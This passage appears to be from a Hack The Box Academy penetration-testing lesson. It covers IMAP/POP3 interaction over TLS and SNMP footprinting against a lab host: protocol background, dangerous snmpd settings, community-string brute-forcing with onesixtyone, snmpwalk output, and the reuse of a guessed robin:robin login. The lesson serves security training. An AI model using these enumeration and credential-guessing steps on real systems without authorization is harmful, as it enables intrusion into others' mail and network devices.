<span class="hljs-comment">* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):</span>
<span class="hljs-comment">* TLSv1.3 (OUT), TLS handshake, Finished (20):</span>
<span class="hljs-comment">* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384</span>
<span class="hljs-comment">* Server certificate:</span>
<span class="hljs-comment">*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb</span>
<span class="hljs-comment">*  start date: Sep 19 19:44:58 2021 GMT</span>
<span class="hljs-comment">*  expire date: Jul  4 19:44:58 2295 GMT</span>
<span class="hljs-comment">*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb</span>
<span class="hljs-comment">*  SSL certificate verify result: self signed certificate (18), continuing anyway.</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):</span>
<span class="hljs-comment">* old SSL session ID is stale, removing</span>
&lt; * OK [CAPABILITY IMAP4rev1 SASL-<span class="hljs-keyword">IR</span> LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
&gt; A001 CAPABILITY
&lt; * CAPABILITY IMAP4rev1 SASL-<span class="hljs-keyword">IR</span> LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
&lt; A001 OK Pre-login capabilities listed, <span class="hljs-keyword">post</span>-login capabilities have <span class="hljs-keyword">more</span>.
&gt; A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
&lt; * CAPABILITY IMAP4rev1 SASL-<span class="hljs-keyword">IR</span> LOGIN-REFERRALS ID ENABLE IDLE <span class="hljs-keyword">SORT</span> <span class="hljs-keyword">SORT</span>=<span class="hljs-keyword">DISPLAY</span> THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS <span class="hljs-keyword">LIST</span>-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=<span class="hljs-keyword">SEARCH</span> <span class="hljs-keyword">LIST</span>-STATUS BINARY <span class="hljs-keyword">MOVE</span> SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-<span class="hljs-keyword">USE</span>
&lt; A002 OK Logged <span class="hljs-keyword">in</span>
&gt; A003 <span class="hljs-keyword">LIST</span> <span class="hljs-string">""</span> *
&lt; * <span class="hljs-keyword">LIST</span> (\HasNoChildren) <span class="hljs-string">"."</span> Important
<span class="hljs-comment">* LIST (\HasNoChildren) "." Important</span>
&lt; * <span class="hljs-keyword">LIST</span> (\HasNoChildren) <span class="hljs-string">"."</span> INBOX
<span class="hljs-comment">* LIST (\HasNoChildren) "." INBOX</span>
&lt; A003 OK <span class="hljs-keyword">List</span> completed (0.001 + 0.000 secs).
<span class="hljs-comment">* Connection #0 to host 10.129.14.128 left intact</span>
</code></pre>
<p>To interact with the IMAP or POP3 server over SSL, we can use <code>openssl</code>, as well as <code>ncat</code>. The commands for this would look like this:</p>
<p><strong>OpenSSL - TLS Encrypted Interaction POP3</strong></p>
<p>IMAP / POP3</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s

CONNECTED(00000003)
Can't <span class="hljs-keyword">use</span> SSL_get_servername
<span class="hljs-keyword">depth</span>=<span class="hljs-number">0</span> C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
<span class="hljs-keyword">verify</span> <span class="hljs-keyword">error</span>:<span class="hljs-keyword">num</span>=<span class="hljs-number">18</span>:<span class="hljs-keyword">self</span> signed certificate
<span class="hljs-keyword">verify</span> <span class="hljs-keyword">return</span>:<span class="hljs-number">1</span>
<span class="hljs-keyword">depth</span>=<span class="hljs-number">0</span> C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
<span class="hljs-keyword">verify</span> <span class="hljs-keyword">return</span>:<span class="hljs-number">1</span>
<span class="hljs-comment">---</span>
Certificate <span class="hljs-keyword">chain</span>
 <span class="hljs-number">0</span> s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb

...SNIP...

<span class="hljs-comment">---</span>
<span class="hljs-keyword">read</span> R <span class="hljs-keyword">BLOCK</span>
<span class="hljs-comment">---</span>
Post-Handshake <span class="hljs-keyword">New</span> <span class="hljs-keyword">Session</span> Ticket arrived:
SSL-<span class="hljs-keyword">Session</span>:
    Protocol  : TLSv1<span class="hljs-number">.3</span>
    Cipher    : TLS_AES_256_GCM_SHA384
    <span class="hljs-keyword">Session</span>-<span class="hljs-keyword">ID</span>: <span class="hljs-number">3</span>CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2
    <span class="hljs-keyword">Session</span>-<span class="hljs-keyword">ID</span>-ctx:
    Resumption PSK: <span class="hljs-number">68419</span>D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9
    PSK <span class="hljs-keyword">identity</span>: <span class="hljs-keyword">None</span>
    PSK <span class="hljs-keyword">identity</span> hint: <span class="hljs-keyword">None</span>
    SRP username: <span class="hljs-keyword">None</span>
    TLS <span class="hljs-keyword">session</span> ticket lifetime hint: <span class="hljs-number">7200</span> (seconds)
    TLS <span class="hljs-keyword">session</span> ticket:
    <span class="hljs-number">0000</span> - d7 <span class="hljs-number">86</span> ac <span class="hljs-number">7</span>e f3 f4 <span class="hljs-number">95</span> <span class="hljs-number">35</span><span class="hljs-number">-88</span> <span class="hljs-number">40</span> a5 b5 d6 a6 <span class="hljs-number">41</span> e4   ...~..<span class="hljs-number">.5</span>.@....A.
    <span class="hljs-number">0010</span> - <span class="hljs-number">96</span> <span class="hljs-number">6</span>c e6 <span class="hljs-number">12</span> <span class="hljs-number">4</span>f <span class="hljs-number">50</span> ce <span class="hljs-number">72</span><span class="hljs-number">-36</span> <span class="hljs-number">25</span> df e1 <span class="hljs-number">72</span> d9 <span class="hljs-number">23</span> <span class="hljs-number">94</span>   .l..OP.r6%..r.#.
    <span class="hljs-number">0020</span> - cc <span class="hljs-number">29</span> <span class="hljs-number">90</span> <span class="hljs-number">08</span> <span class="hljs-number">58</span> <span class="hljs-number">1</span>b <span class="hljs-number">57</span> ab-db a8 <span class="hljs-number">6</span>b f7 <span class="hljs-number">8</span>f <span class="hljs-number">31</span> <span class="hljs-number">5</span>b ad   .)..X.W...k.<span class="hljs-number">.1</span>[.
    <span class="hljs-number">0030</span> - <span class="hljs-number">47</span> <span class="hljs-number">94</span> f4 <span class="hljs-number">67</span> <span class="hljs-number">58</span> <span class="hljs-number">1</span>f <span class="hljs-number">96</span> d9-ca ca <span class="hljs-number">56</span> f9 <span class="hljs-number">7</span>a <span class="hljs-number">12</span> f6 <span class="hljs-number">6</span>d   G..gX.....V.z..m
    <span class="hljs-number">0040</span> - <span class="hljs-number">43</span> b9 b6 <span class="hljs-number">68</span> de db b2 <span class="hljs-number">47</span><span class="hljs-number">-4</span>f <span class="hljs-number">9</span>f <span class="hljs-number">48</span> <span class="hljs-number">14</span> <span class="hljs-number">40</span> <span class="hljs-number">45</span> <span class="hljs-number">8</span>f <span class="hljs-number">89</span>   C..h...GO.H.@E..
    <span class="hljs-number">0050</span> - fa <span class="hljs-number">19</span> <span class="hljs-number">35</span> <span class="hljs-number">9</span>c <span class="hljs-number">6</span>d <span class="hljs-number">3</span>c a1 <span class="hljs-number">46</span><span class="hljs-number">-5</span>c a2 <span class="hljs-number">65</span> ab <span class="hljs-number">87</span> a4 fd <span class="hljs-number">5</span>e   .<span class="hljs-number">.5</span>.m&lt;.F\.e....^
    <span class="hljs-number">0060</span> - a2 <span class="hljs-number">95</span> <span class="hljs-number">25</span> d4 <span class="hljs-number">43</span> b8 <span class="hljs-number">71</span> <span class="hljs-number">70</span><span class="hljs-number">-40</span> <span class="hljs-number">6</span>c fe <span class="hljs-number">6</span>f <span class="hljs-number">0</span>e d1 a0 <span class="hljs-number">38</span>   ..%.C.qp@l.o..<span class="hljs-number">.8</span>
    <span class="hljs-number">0070</span> - <span class="hljs-number">6</span>e bd <span class="hljs-number">73</span> <span class="hljs-number">91</span> ed <span class="hljs-number">05</span> <span class="hljs-number">89</span> <span class="hljs-number">83</span>-f5 <span class="hljs-number">3</span>e d9 <span class="hljs-number">2</span>a e0 <span class="hljs-number">2</span>e <span class="hljs-number">96</span> f8   n.s......&gt;.*....
    <span class="hljs-number">0080</span> - <span class="hljs-number">99</span> f0 <span class="hljs-number">50</span> <span class="hljs-number">15</span> e0 <span class="hljs-number">1</span>b <span class="hljs-number">66</span> db<span class="hljs-number">-7</span>c <span class="hljs-number">9</span>f <span class="hljs-number">10</span> <span class="hljs-number">80</span> <span class="hljs-number">4</span>a a1 <span class="hljs-number">8</span>b <span class="hljs-number">24</span>   ..P...f.|...J..$
    <span class="hljs-number">0090</span> - bb <span class="hljs-number">00</span> <span class="hljs-number">03</span> d4 <span class="hljs-number">93</span> <span class="hljs-number">2</span>b d9 <span class="hljs-number">95</span><span class="hljs-number">-64</span> <span class="hljs-number">44</span> <span class="hljs-number">5</span>b c2 <span class="hljs-number">6</span>b <span class="hljs-number">2</span>e <span class="hljs-number">01</span> b5   .....+..dD[.k...
    <span class="hljs-number">00</span>a0 - e8 <span class="hljs-number">1</span>b f4 a4 <span class="hljs-number">98</span> a7 <span class="hljs-number">7</span>a <span class="hljs-number">7</span>d<span class="hljs-number">-0</span>a <span class="hljs-number">80</span> cc <span class="hljs-number">0</span>a ad fe <span class="hljs-number">6</span>e b3   ......z}......n.
    <span class="hljs-number">00</span>b0 - <span class="hljs-number">0</span>a d6 <span class="hljs-number">50</span> <span class="hljs-number">5</span>d fd <span class="hljs-number">9</span>a b4 <span class="hljs-number">5</span>c<span class="hljs-number">-28</span> a4 c9 <span class="hljs-number">36</span> e4 <span class="hljs-number">7</span>d <span class="hljs-number">2</span>a <span class="hljs-number">1</span>e   ..P]...\(.<span class="hljs-number">.6</span>.}*.

    <span class="hljs-keyword">Start</span> <span class="hljs-keyword">Time</span>: <span class="hljs-number">1632081313</span>
    <span class="hljs-keyword">Timeout</span>   : <span class="hljs-number">7200</span> (sec)
    <span class="hljs-keyword">Verify</span> <span class="hljs-keyword">return</span> code: <span class="hljs-number">18</span> (<span class="hljs-keyword">self</span> signed certificate)
    <span class="hljs-keyword">Extended</span> <span class="hljs-keyword">master</span> secret: <span class="hljs-keyword">no</span>
    <span class="hljs-keyword">Max</span> Early <span class="hljs-keyword">Data</span>: <span class="hljs-number">0</span>
<span class="hljs-comment">---</span>
<span class="hljs-keyword">read</span> R <span class="hljs-keyword">BLOCK</span>
+OK HTB-Academy POP3 <span class="hljs-keyword">Server</span>
</code></pre>
<p><strong>OpenSSL - TLS Encrypted Interaction IMAP</strong></p>
<p>IMAP / POP3</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ openssl s<span class="hljs-emphasis">_client -connect 10.129.14.128:imaps

</span>CONNECTED(00000003)
Can't use SSL<span class="hljs-emphasis">_get_</span>servername
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb
<span class="hljs-section">verify return:1
---</span>
Certificate chain
<span class="hljs-code"> 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb</span>

...SNIP...

<span class="hljs-bullet">---
</span><span class="hljs-section">read R BLOCK
---</span>
Post-Handshake New Session Ticket arrived:
SSL-Session:
<span class="hljs-code">    Protocol  : TLSv1.3</span>
<span class="hljs-code">    Cipher    : TLS_AES_256_GCM_SHA384</span>
<span class="hljs-code">    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699</span>
<span class="hljs-code">    Session-ID-ctx:</span>
<span class="hljs-code">    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633</span>
<span class="hljs-code">    PSK identity: None</span>
<span class="hljs-code">    PSK identity hint: None</span>
<span class="hljs-code">    SRP username: None</span>
<span class="hljs-code">    TLS session ticket lifetime hint: 7200 (seconds)</span>
<span class="hljs-code">    TLS session ticket:</span>
<span class="hljs-code">    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$</span>
<span class="hljs-code">    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&amp;..J}</span>
<span class="hljs-code">    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.</span>
<span class="hljs-code">    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)</span>
<span class="hljs-code">    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..</span>
<span class="hljs-code">    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..</span>
<span class="hljs-code">    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....</span>
<span class="hljs-code">    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..</span>
<span class="hljs-code">    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.</span>
<span class="hljs-code">    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!</span>
<span class="hljs-code">    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}</span>
<span class="hljs-code">    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb</span>

<span class="hljs-code">    Start Time: 1632081604</span>
<span class="hljs-code">    Timeout   : 7200 (sec)</span>
<span class="hljs-code">    Verify return code: 18 (self signed certificate)</span>
<span class="hljs-code">    Extended master secret: no</span>
<span class="hljs-section">    Max Early Data: 0
---</span>
read R BLOCK
<span class="hljs-bullet">* </span>OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
</code></pre>
<p>Once we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server. We want to point out that the configuration of our own mail server, the research for it, and the experiments we can do together with other community members will give us the know-how to understand the communication taking place and what configuration options are responsible for this.</p>
<p>In the SMTP section, we have found the user <code>robin</code>. Another member of our team was able to find out that the user also uses his username as a password (<code>robin</code>:<code>robin</code>). We can use these credentials and try them to interact with the IMAP/POP3 services.</p>
<h2 id="snmp">SNMP</h2>
<hr>
<p><code>Simple Network Management Protocol</code> (<a href="https://datatracker.ietf.org/doc/html/rfc1157">SNMP</a>) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is <code>SNMPv3</code>, which increases the security of SNMP in particular, but also the complexity of using this protocol.</p>
<p>In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port <code>161</code>. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called <code>traps</code> over UDP port <code>162</code>. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.</p>
<p>For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.</p>
<p><strong>MIB</strong></p>
<p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the <code>Management Information Base</code> (<code>MIB</code>) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one <code>Object Identifier</code> (<code>OID</code>), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the <code>Abstract Syntax Notation One</code> (<code>ASN.1</code>) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p>
<p><strong>OID</strong></p>
<p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node&#39;s position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the <a href="https://www.alvestrand.no/objectid/">Object Identifier Registry</a>.</p>
<p><strong>SNMPv1</strong></p>
<p>SNMP version 1 (<code>SNMPv1</code>) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has <code>no built-in authentication</code> mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it <code>does not support encryption</code>, meaning that all data is sent in plain text and can be easily intercepted.</p>
<p><strong>SNMPv2</strong></p>
<p>SNMPv2 existed in different versions. The version still exists today is <code>v2c</code>, and the extension <code>c</code> means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the <code>community string</code> that provides security is only transmitted in plain text, meaning it has no built-in encryption.</p>
<p><strong>SNMPv3</strong></p>
<p>The security has been increased enormously for <code>SNMPv3</code> by security features such as <code>authentication</code> using username and password and transmission <code>encryption</code> (via <code>pre-shared key</code>) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than <code>v2c</code>.</p>
<p><strong>Community Strings</strong></p>
<p>Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using <code>SNMPv2</code>, as the transition to <code>SNMPv3</code> can be very complex, but the services still need to remain active. This causes many administrators a great deal of concern and creates some problems they are keen to avoid. The lack of knowledge about how the information can be obtained and how we as attackers use it makes the administrators&#39; approach seem inexplicable. At the same time, the lack of encryption of the data sent is also a problem. Because every time the community strings are sent over the network, they can be intercepted and read.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>The default configuration of the SNMP daemon defines the basic settings for the service, which include the IP addresses, ports, MIB, OIDs, authentication, and community strings.</p>
<p><strong>SNMP Daemon Config</strong></p>
<p>SNMP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/snmp/snmpd.conf | grep -v <span class="hljs-string">"#"</span> | sed -r <span class="hljs-string">'/^\s*$/d'</span>

sysLocation    Sitting on the Dock of the Bay
sysContact     Me &lt;me@example.org&gt;
sysServices    <span class="hljs-number">72</span>
master  agentx
agentaddress  <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>,[::<span class="hljs-number">1</span>]
view   systemonly  included   .<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span>
view   systemonly  included   .<span class="hljs-number">1.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.25</span><span class="hljs-meta">.1</span>
rocommunity  <span class="hljs-meta">public</span> <span class="hljs-meta">default</span> -V systemonly
rocommunity6 <span class="hljs-meta">public</span> <span class="hljs-meta">default</span> -V systemonly
rouser authPrivUser authpriv -V systemonly
</code></pre>
<p>The configuration of this service can also be changed in many ways. Therefore, we recommend setting up a VM to install and configure the SNMP server ourselves. All the settings that can be made for the SNMP daemon are defined and described in the <a href="http://www.net-snmp.org/docs/man/snmpd.conf.html">manpage</a>.</p>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>Some dangerous settings that the administrator can make with SNMP are:</p>
<table>
<thead>
<tr>
<th><strong>Settings</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rwuser noauth</code></td>
<td>Provides access to the full OID tree without authentication.</td>
</tr>
<tr>
<td><code>rwcommunity &lt;community string&gt; &lt;IPv4 address&gt;</code></td>
<td>Provides access to the full OID tree regardless of where the requests were sent from.</td>
</tr>
<tr>
<td><code>rwcommunity6 &lt;community string&gt; &lt;IPv6 address&gt;</code></td>
<td>Same access as with <code>rwcommunity</code> with the difference of using IPv6.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>For footprinting SNMP, we can use tools like <code>snmpwalk</code>, <code>onesixtyone</code>, and <code>braa</code>. <code>Snmpwalk</code> is used to query the OIDs with their information. <code>Onesixtyone</code> can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time.</p>
<p><strong>SNMPwalk</strong></p>
<p>SNMP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ snmpwalk -v2c -c <span class="hljs-meta">public</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>

iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.0</span> = STRING: <span class="hljs-string">"Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.0</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.1</span><span class="hljs-meta">.8072</span><span class="hljs-meta">.3</span><span class="hljs-meta">.2</span><span class="hljs-meta">.10</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.3</span><span class="hljs-meta">.0</span> = Timeticks: (<span class="hljs-number">5134</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">51.34</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span><span class="hljs-meta">.0</span> = STRING: <span class="hljs-string">"mrb3n@inlanefreight.htb"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.5</span><span class="hljs-meta">.0</span> = STRING: <span class="hljs-string">"htb"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.0</span> = STRING: <span class="hljs-string">"Sitting on the Dock of the Bay"</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.7</span><span class="hljs-meta">.0</span> = INTEGER: <span class="hljs-number">72</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.8</span><span class="hljs-meta">.0</span> = Timeticks: (<span class="hljs-number">0</span>) <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.00</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.10</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.2</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.11</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.3</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.15</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.4</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.1</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.5</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.6</span><span class="hljs-meta">.3</span><span class="hljs-meta">.16</span><span class="hljs-meta">.2</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.6</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.49</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.7</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.4</span>
iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.9</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.8</span> = OID: iso<span class="hljs-meta">.3</span><span class="hljs-meta">.6</span><span class="hljs-meta">.1</span><span class="hljs-meta">.2</span><span class="hljs-meta">.1</span><span class="hljs-meta">.50</span>
